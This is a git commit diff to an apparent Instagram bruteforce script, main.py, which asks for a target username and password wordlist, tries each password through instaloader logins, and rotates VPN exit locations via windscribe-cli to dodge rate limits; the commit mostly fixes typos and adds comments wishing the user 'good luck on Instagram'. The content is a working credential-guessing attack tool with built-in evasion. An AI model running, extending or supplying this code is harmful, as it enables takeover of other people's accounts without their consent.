ea6cbb7cfed065287897637c0ed8661cc330e0de
KalyWareSEC <112941960+KalyWareSEC@users.noreply.github.com>
2022-10-16 11:53:26 +0300

    Fixed, Updated main.py
     • Some translation mistakes
     • Some program errors
    
      ✅  Fixed

--- Linux/main.py
+++ Linux/main.py
@@ -1,3 +1,9 @@
+# I found that the main.py file was missing, corrupt or outdated and needed to be fixed. I fixed it and I'm making it available, good luck on Instagram! :D
+# If you're trying to run Kali on Linux, you're probably getting a windscribe error. i fixed it just download windscribe to Kali correctly and start its service
+# Edit the main.py file and delete all the code in it and paste and save what you see here and then "python3 main.py" KA-BOOM! Good luck
+
+
+
 import os
 import instaloader
 from getpass import getpass
@@ -20,15 +26,15 @@ codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W",
             "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
 L = instaloader.Instaloader()
 veri_break = "no"
-print("\nVpn starting...\n")
-print(bcolors.OKBLUE+"Vpn successiful started"+bcolors.ENDC)
+print("\nVPN starting...\n")
+print(bcolors.OKBLUE+"VPN successfully started"+bcolors.ENDC)
 while True:
     if veri_break == "si":
         break
     USER = ""
     USER = input('\nEnter Instagram Username to bruteforce: ')
     wl = input("\nEnter world list name: ")
-    sleepp = int(input("\nInsert sleep time for login [Raccomanded 900(15min)]: "))
+    sleepp = int(input("\nInsert sleep time for login [Recommended 900(15min)]: "))
     while True:
         sub.call("clear")
         procedere = input("Username to bruteforce = "+USER+"\n\nWordlist = "+wl+"\n\nSleep time = "+str(sleepp)+bcolors.WARNING+"\n\nProoceding? [y/break/modify]: "+bcolors.ENDC)
@@ -60,16 +66,16 @@ for line in Lines:
         choiceCode = random.choice(codeList)
         time.sleep(1)
         print("\n[Changing ip address]")
-        os.system("\nwindscribe connect " + choiceCode)
+        os.system("\nwindscribe-cli connect " + choiceCode)
         print(bcolors.WARNING+"\nTrying "+pstest+"..."+bcolors.ENDC)
         L.login(USER , PASSWORD)
         print(bcolors.OKGREEN+bcolors.UNDERLINE+bcolors.BOLD+"\nPassword found"+bcolors.ENDC+bcolors.OKGREEN+": "+bcolors.ENDC+pstest)
         break
         print("\n Turn off vpn")
-        os.system("\nwindscribe disconnect ")
+        os.system("\nwindscribe-cli disconnect ")
     except instaloader.exceptions.BadCredentialsException:
         pass
-        print(bcolors.FAIL+"Incorret password: "+pstest+bcolors.ENDC)
+        print(bcolors.FAIL+"Incorrect password: "+pstest+bcolors.ENDC)
         print("sleep for "+ str(sleepp))
         time.sleep(sleepp)
 
@@ -77,8 +83,8 @@ for line in Lines:
         print(bcolors.FAIL+"\nInstagram has been requested verification via sms, try to set more login time..."+bcolors.ENDC)
         break
         print("\n Turn off vpn")
-        os.system("\nwindscribe disconnect ")
+        os.system("\nwindscribe-cli disconnect ")
     except instaloader.exceptions.InvalidArgumentException:
         print(bcolors.FAIL+"\nUsername not found"+bcolors.ENDC)
         print("\n Turn off vpn")
-        os.system("\nwindscribe disconnect ")
+        os.system("\nwindscribe-cli disconnect ")
